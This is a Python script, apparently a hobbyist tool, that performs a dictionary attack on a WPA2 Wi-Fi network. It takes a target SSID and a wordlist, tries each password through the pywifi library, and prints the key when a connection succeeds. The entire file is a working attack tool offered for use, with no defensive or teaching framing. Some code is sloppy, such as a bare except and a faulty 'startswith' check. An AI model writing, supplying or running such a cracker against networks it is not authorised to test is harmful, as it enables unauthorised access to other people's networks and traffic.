import argparse
import os.path
import platform
import time

try:
    import pywifi
    from pywifi import pyWiFi, const, Profile, PyWiFi
except:
    print("Installing pywifi Module")

RED = "\033[1;31m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD = "\033[;1m"
REVERSE = "\033[;7m"

try:
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]

    # checking the Wi-Fi interfaces (Wi-Fi cards)
    ifaces.scan()
    results = ifaces.scan_results()

    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
except:
    print("[-] Error system")

type = False


def main(ssid, password, number):
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    # your network speed may be slow so you can increase the time
    time.sleep(0.1)  # if script is not working properly then increase the time
    iface.connect(tmp_profile)  # trying to connect
    time.sleep(0.35)  # if script is not working properly then increase the time

    if ifaces.status() == const.IFACE_CONNECTED:
        time.sleep(1)
        print(BLUE, GREEN, '[*] Crack success!', RESET)
        print(BLUE, GREEN, '[*] Password is:', password, RESET)
        time.sleep(1)
        exit()
    else:
        print(RED, "[{}] Crack Failed using {}".format(number, password))


def pwd(ssid, file):
    number = 0
    with open(file, 'r', encoding='utf-8') as words:
        for line in words:
            number += 1
            line = line.split("\n")
            pwd = line[0]
            main(ssid, pwd, number)


def menu():
    parser = argparse.ArgumentParser(description='argparse Ex')

    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list..')

    group1 = parser.add_mutually_exclusive_group()

    group1.add_argument('-v', '--version', metavar='', help='version')
    print(" ")

    args = parser.parse_args()

    print(CYAN, "[+] You are using", BOLD, platform.system(), platform.machine(), "...")
    time.sleep(2.5)

    if args.wordlist and args.ssid:
        ssid = args.ssid
        file1 = args.wordlist
    elif args.version:
        print("\n\n", CYAN, "by @olanrewajutmuritala\n")
        print(GREEN, "CopyRight 2024\n\n")
        exit()
    else:
        print(BLUE)
        ssid = input("[*] SSID: ")
        file1 = input("[*] pwds file: ")

    if os.path.exists(file1):
        if platform.system().startswith("Win" or "win"):
            os.system("cls")
        else:
            os.system("clear")

        print(BLUE, "[*] Cracking..")
        pwd(ssid, file1)

    else:
        print(RED, "[-] NO SUCH FILE..", BLUE)


if __name__ == "__main__":
    menu()